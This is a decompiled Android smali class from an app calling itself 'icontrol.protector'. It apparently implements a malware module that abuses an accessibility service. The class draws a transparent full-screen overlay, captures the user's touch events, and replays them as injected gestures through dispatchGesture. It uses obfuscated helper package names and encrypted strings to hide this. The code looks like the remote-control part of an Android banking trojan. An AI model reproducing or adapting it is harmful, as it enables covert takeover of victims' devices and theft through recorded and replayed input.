.class public abstract Lcom/icontrol/protector/w;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/w$c;
    }
.end annotation


# static fields
.field public static a:Landroid/widget/FrameLayout; = null

.field public static b:Landroid/view/WindowManager$LayoutParams; = null

.field private static c:Landroid/view/WindowManager; = null

.field private static d:Z = false

.field private static e:Z = true

.field private static f:Z = false

.field private static g:Z = false

.field public static h:Lcom/icontrol/protector/AccessServices;

.field private static i:Ljava/util/LinkedList;

.field private static j:Ljava/util/LinkedList;

.field private static k:J

.field private static l:J

.field static m:I

.field private static n:J

.field private static o:J


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/w;->j:Ljava/util/LinkedList;

    const-wide/16 v0, 0x1

    sput-wide v0, Lcom/icontrol/protector/w;->k:J

    return-void
.end method

.method public static synthetic a(Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/icontrol/protector/w;->k(Landroid/view/View;Landroid/view/MotionEvent;)Z

    move-result p0

    return p0
.end method

.method static synthetic b()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/w;->d()V

    return-void
.end method

.method private static c()V
    .locals 3

    .line 1
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sget-object v1, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/AbstractCollection;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/MotionEvent;

    invoke-static {v2}, Landroid/view/MotionEvent;->obtain(Landroid/view/MotionEvent;)Landroid/view/MotionEvent;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    :cond_0
    sget-object v1, Lcom/icontrol/protector/w;->j:Ljava/util/LinkedList;

    invoke-virtual {v1, v0}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method private static d()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/w;->m()V

    invoke-static {}, Lcom/icontrol/protector/w;->e()V

    return-void
.end method

.method private static e()V
    .locals 2

    .line 1
    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/w;->l:J

    const-wide/16 v0, 0x1

    sput-wide v0, Lcom/icontrol/protector/w;->k:J

    const/4 v0, 0x0

    sput-boolean v0, Lcom/icontrol/protector/w;->g:Z

    sput-boolean v0, Lcom/icontrol/protector/w;->d:Z

    return-void
.end method

.method public static f(Lcom/icontrol/protector/AccessServices;Landroid/accessibilityservice/GestureDescription;Lcom/icontrol/protector/w$c;)V
    .locals 1

    .line 1
    new-instance v0, Lcom/icontrol/protector/w$b;

    invoke-direct {v0, p2}, Lcom/icontrol/protector/w$b;-><init>(Lcom/icontrol/protector/w$c;)V

    const/4 p2, 0x0

    invoke-virtual {p0, p1, v0, p2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void
.end method

.method private static g(Landroid/accessibilityservice/GestureDescription;)V
    .locals 3

    .line 1
    sget-object v0, Lcom/icontrol/protector/w;->h:Lcom/icontrol/protector/AccessServices;

    new-instance v1, Lcom/icontrol/protector/w$a;

    invoke-direct {v1}, Lcom/icontrol/protector/w$a;-><init>()V

    const/4 v2, 0x0

    invoke-virtual {v0, p0, v1, v2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void
.end method

.method static h()V
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    return-void
.end method

.method private static i()V
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/x40;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/x40;-><init>()V

    invoke-virtual {v0, v1}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    return-void
.end method

.method private static j(Lcom/icontrol/protector/AccessServices;)V
    .locals 5

    .line 1
    new-instance v0, Landroid/widget/FrameLayout;

    invoke-direct {v0, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    invoke-static {}, Lcom/icontrol/protector/w;->i()V

    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const v2, 0x40008

    const/4 v3, 0x1

    const/16 v4, 0x7f0

    invoke-direct {v0, v4, v2, v3}, Landroid/view/WindowManager$LayoutParams;-><init>(III)V

    sput-object v0, Lcom/icontrol/protector/w;->b:Landroid/view/WindowManager$LayoutParams;

    const v2, 0x800033

    iput v2, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    const/4 v2, -0x1

    iput v2, v0, Landroid/view/WindowManager$LayoutParams;->width:I

    iput v2, v0, Landroid/view/WindowManager$LayoutParams;->height:I

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/WindowManager;

    sput-object p0, Lcom/icontrol/protector/w;->c:Landroid/view/WindowManager;

    sget-object p0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Landroid/view/View;->setBackgroundColor(I)V

    sget-object p0, Lcom/icontrol/protector/w;->c:Landroid/view/WindowManager;

    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    sget-object v1, Lcom/icontrol/protector/w;->b:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {p0, v0, v1}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x3t
        0x7dt
        0x1bt
        -0x12t
        0x6ct
        -0x31t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x76t
        0x14t
        0x75t
        -0x76t
        0x3t
        -0x48t
        -0x1ft
        0x22t
    .end array-data
.end method

.method private static synthetic k(Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 4

    .line 1
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getAction()I

    move-result p0

    const/4 v0, 0x0

    const/4 v1, 0x1

    if-eqz p0, :cond_3

    if-eq p0, v1, :cond_2

    const/4 v2, 0x2

    if-eq p0, v2, :cond_1

    const/4 p1, 0x3

    if-eq p0, p1, :cond_0

    const/4 p1, 0x4

    if-eq p0, p1, :cond_0

    goto :goto_1

    :cond_0
    sput-boolean v0, Lcom/icontrol/protector/w;->f:Z

    sget-boolean p0, Lcom/icontrol/protector/w;->d:Z

    if-eqz p0, :cond_4

    invoke-static {}, Lcom/icontrol/protector/w;->e()V

    goto :goto_1

    :cond_1
    sget-boolean p0, Lcom/icontrol/protector/w;->e:Z

    if-eqz p0, :cond_4

    sget-boolean p0, Lcom/icontrol/protector/w;->d:Z

    if-eqz p0, :cond_4

    sget p0, Lcom/icontrol/protector/w;->m:I

    add-int/2addr p0, v1

    sput p0, Lcom/icontrol/protector/w;->m:I

    :goto_0
    sget-object p0, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-static {p1}, Landroid/view/MotionEvent;->obtain(Landroid/view/MotionEvent;)Landroid/view/MotionEvent;

    move-result-object p1

    invoke-virtual {p0, p1}, Ljava/util/LinkedList;->offer(Ljava/lang/Object;)Z

    goto :goto_1

    :cond_2
    sput-boolean v0, Lcom/icontrol/protector/w;->f:Z

    sget-boolean p0, Lcom/icontrol/protector/w;->d:Z

    if-eqz p0, :cond_4

    sget p0, Lcom/icontrol/protector/w;->m:I

    add-int/2addr p0, v1

    sput p0, Lcom/icontrol/protector/w;->m:I

    sget-object p0, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-static {p1}, Landroid/view/MotionEvent;->obtain(Landroid/view/MotionEvent;)Landroid/view/MotionEvent;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/util/LinkedList;->offer(Ljava/lang/Object;)Z

    invoke-static {}, Lcom/icontrol/protector/w;->c()V

    sput-boolean v0, Lcom/icontrol/protector/w;->d:Z

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getEventTime()J

    move-result-wide p0

    sput-wide p0, Lcom/icontrol/protector/w;->o:J

    invoke-static {}, Lcom/icontrol/protector/w;->l()V

    goto :goto_1

    :cond_3
    sput-boolean v1, Lcom/icontrol/protector/w;->f:Z

    sget-boolean p0, Lcom/icontrol/protector/w;->d:Z

    if-nez p0, :cond_4

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getEventTime()J

    move-result-wide v2

    sput-wide v2, Lcom/icontrol/protector/w;->n:J

    sput v0, Lcom/icontrol/protector/w;->m:I

    sput-boolean v1, Lcom/icontrol/protector/w;->d:Z

    goto :goto_0

    :cond_4
    :goto_1
    return v0
.end method

.method private static l()V
    .locals 10

    .line 1
    sget-boolean v0, Lcom/icontrol/protector/w;->g:Z

    if-nez v0, :cond_0

    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/w;->g:Z

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/16 v1, 0x14

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v0, v0, 0x28

    int-to-long v0, v0

    sput-wide v0, Lcom/icontrol/protector/w;->k:J

    :cond_0
    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    sget-object v1, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/LinkedList;->poll()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/MotionEvent;

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    invoke-virtual {v1}, Landroid/view/MotionEvent;->getRawX()F

    move-result v3

    invoke-virtual {v1}, Landroid/view/MotionEvent;->getRawY()F

    move-result v1

    const/4 v4, 0x0

    cmpg-float v5, v3, v4

    const/high16 v6, 0x3f800000    # 1.0f

    if-gez v5, :cond_1

    move v3, v6

    :cond_1
    cmpg-float v5, v1, v4

    if-gez v5, :cond_2

    move v1, v6

    :cond_2
    invoke-virtual {v2, v3, v1}, Landroid/graphics/Path;->moveTo(FF)V

    :goto_0
    sget-object v1, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_5

    sget-object v1, Lcom/icontrol/protector/w;->i:Ljava/util/LinkedList;

    invoke-virtual {v1}, Ljava/util/LinkedList;->poll()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/MotionEvent;

    invoke-virtual {v1}, Landroid/view/MotionEvent;->getRawX()F

    move-result v3

    invoke-virtual {v1}, Landroid/view/MotionEvent;->getRawY()F

    move-result v1

    cmpg-float v5, v3, v4

    if-gez v5, :cond_3

    move v3, v6

    :cond_3
    cmpg-float v5, v1, v4

    if-gez v5, :cond_4

    move v1, v6

    :cond_4
    invoke-virtual {v2, v3, v1}, Landroid/graphics/Path;->lineTo(FF)V

    goto :goto_0

    :cond_5
    sget-wide v3, Lcom/icontrol/protector/w;->o:J

    sget-wide v5, Lcom/icontrol/protector/w;->n:J

    sub-long/2addr v3, v5

    sput-wide v3, Lcom/icontrol/protector/w;->l:J

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    const-wide/16 v8, 0x1

    if-lt v1, v3, :cond_7

    sget-wide v3, Lcom/icontrol/protector/w;->l:J

    const-wide/16 v5, 0x0

    cmp-long v1, v3, v5

    if-nez v1, :cond_6

    sput-wide v8, Lcom/icontrol/protector/w;->l:J

    :cond_6
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/w40;->a()V

    sget-wide v3, Lcom/icontrol/protector/w;->k:J

    sget-wide v5, Lcom/icontrol/protector/w;->l:J

    const/4 v7, 0x0

    invoke-static/range {v2 .. v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    :cond_7
    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    invoke-static {}, Lcom/icontrol/protector/w;->h()V

    invoke-static {v0}, Lcom/icontrol/protector/w;->g(Landroid/accessibilityservice/GestureDescription;)V

    sput-wide v8, Lcom/icontrol/protector/w;->k:J

    return-void
.end method

.method private static m()V
    .locals 2

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/i;->f:Z

    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    return-void
.end method

.method public static n(Lcom/icontrol/protector/AccessServices;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/w;->a:Landroid/widget/FrameLayout;

    if-nez v0, :cond_0

    sput-object p0, Lcom/icontrol/protector/w;->h:Lcom/icontrol/protector/AccessServices;

    sget-object p0, Lcom/icontrol/protector/w;->h:Lcom/icontrol/protector/AccessServices;

    invoke-static {p0}, Lcom/icontrol/protector/w;->j(Lcom/icontrol/protector/AccessServices;)V

    :cond_0
    sget-object p0, Lcom/icontrol/protector/w;->j:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    invoke-static {}, Lcom/icontrol/protector/w;->m()V

    return-void
.end method

.method public static o(Lcom/icontrol/protector/v;)V
    .locals 1

    .line 1
    invoke-static {}, Lcom/icontrol/protector/w;->h()V

    sget-object v0, Lcom/icontrol/protector/w;->j:Ljava/util/LinkedList;

    invoke-interface {p0, v0}, Lcom/icontrol/protector/v;->a(Ljava/util/LinkedList;)V

    return-void
.end method
